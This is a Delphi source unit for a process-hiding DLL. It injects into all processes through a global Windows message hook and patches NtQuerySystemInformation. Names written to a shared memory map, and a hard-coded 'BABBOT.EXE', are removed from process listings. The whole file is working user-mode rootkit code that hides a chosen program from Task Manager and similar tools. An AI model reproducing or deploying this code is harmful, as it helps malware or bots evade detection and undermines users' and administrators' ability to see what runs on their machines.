unit HookDllMain;

interface
uses
  Windows , Messages , TlHelp32 , Sysutils ,
  NTHookUnit;

const
   MappingFileName = 'Hider_1.0';
   FileNameLength  = 100;
   Trap            = True;

type
  TShareMem = packed record
    FileCount : integer;
    FileNames : array [0..2000] of char;
  end;

  PShareMem = ^TShareMem;
  TPDWord = ^DWORD;
  UNICODE_STRING = Record
    Length  : SHORT;
    MaxLen  : SHORT ;
    Name    : Pointer;
  end;

  TProcessInfo=Record
    NextEntryDelta : ULONG;
    ThreadCount    : ULONG;
    Reserved1      : array [1..6] of ULONG;
    CreateTime     : LARGE_INTEGER;
    UserTime       : LARGE_INTEGER;
    KernelTime     : LARGE_INTEGER;
    ProcessName    : UNICODE_STRING;
    BasePriority   : ULONG;
    ProcessId      : ULONG;
  end;
  PProcessInfo = ^TProcessInfo;

  function NtQuerySystemInformation(infoClass: DWORD;
                                  buffer: Pointer;
                                  bufSize: DWORD;
                                  returnSize: TPDWord): DWORD; stdcall;
  procedure HideProcess(FileName : Pchar); stdcall;
  procedure StopHook; stdcall;

implementation

var
  pShMem : PShareMem;
  hMappingFile : THandle;
  Hook : THookClass;
  MessageHook : Thandle;

function NtQuerySystemInformation ; external 'NTDLL.DLL' name 'NtQuerySystemInformation'

(*----------------------------------------------------------------------------*)
function CheckFileIsHideFile(var lppe : TProcessEntry32) : Boolean;stdcall;
begin
  Result := Uppercase(lppe.szExeFile) = 'BABBOT.EXE'
end;

(*----------------------------------------------------------------------------*)
function HideProcessStru(HideFile : PChar ; Buf : Pointer) : integer;stdcall;
var
  P , LastP : PProcessInfo;
  PW : PWideChar;
  FileName : String;
begin
  Result := NO_ERROR;
  FileName := Uppercase(HideFile);
  P := Buf;
  LastP := NIL;
  while P.NextEntryDelta<>0 do begin
    PW := P.ProcessName.Name;
    if Uppercase(String(PW))=FileName then begin
      if LastP <> nil then
        LastP.NextEntryDelta := LastP.NextEntryDelta + P.NextEntryDelta;
    end;
    LastP := P;
    P := Ptr(DWORD(P) + P.NextEntryDelta);
  end;
end;

(*----------------------------------------------------------------------------*)
function NewNtQuerySystemInformation(infoClass: DWORD;
                                      buffer: Pointer;
                                      bufSize: DWORD;
                                      returnSize: TPDWord): DWORD; stdcall;
type
  TNtQuerySystemInformation = Function(infoClass: DWORD;
                                  buffer: Pointer;
                                  bufSize: DWORD;
                                  returnSize: TPDWord): DWORD; stdcall;
begin
  Hook.Restore;
  Result := TNtQuerySystemInformation(Hook.OldFunction)(infoClass,
                                                        buffer,
                                                        bufSize,
                                                        returnSize);
  if infoClass = 5 then begin
    HideProcessStru(pShMem^.FileNames,Buffer);
  end;
  Hook.Change;
end;

(*----------------------------------------------------------------------------*)
function GetMsgProc(code: integer; wPar: integer; lPar: integer): Integer; stdcall;
begin
  Result := CallNextHookEx(MessageHook, Code, wPar, lPar);
end;

(*----------------------------------------------------------------------------*)
procedure HideProcess(FileName : Pchar); stdcall;
begin
  if MessageHook=0 then begin
    MessageHook := SetWindowsHookEx(WH_GetMessage, GetMsgProc, HInstance, 0);
  end;
  StrlCopy(pShMem^.FileNames + pShMem^.FileCount * FileNameLength ,
           FileName ,
           FileNameLength);
  Inc(pShMem^.FileCount);
end;

(*----------------------------------------------------------------------------*)
procedure StopHook; stdcall;
begin
   if MessageHook<>0 then begin
     UnhookWindowsHookEx(MessageHook);
     MessageHook := 0;
     SendMessage(HWND_BROADCAST,WM_SETTINGCHANGE,0,0);
   end;
end;

initialization
  hMappingFile := OpenFileMapping(FILE_MAP_WRITE,False,MappingFileName);
  if hMappingFile=0 then
    hMappingFile  := CreateFileMapping($FFFFFFFF,nil,PAGE_READWRITE,0,SizeOf(TShareMem),MappingFileName);
  if hMappingFile = 0 then Exception.Create('Mapping File error!');
  pShMem :=  MapViewOfFile(hMappingFile,FILE_MAP_WRITE or FILE_MAP_READ,0,0,0);
  pShMem.FileCount := 0;
  if pShMem = nil then begin
    CloseHandle(hMappingFile);
    Exception.Create('Error in reading mapping file!');
  end;
  MessageHook := 0;
  Hook := THookClass.Create(Trap,@NtQuerySystemInformation,@NewNtQuerySystemInformation);
finalization
  Hook.Destroy;
  UnMapViewOfFile(pShMem);
  CloseHandle(hMappingFile);
  StopHook;
  
end.

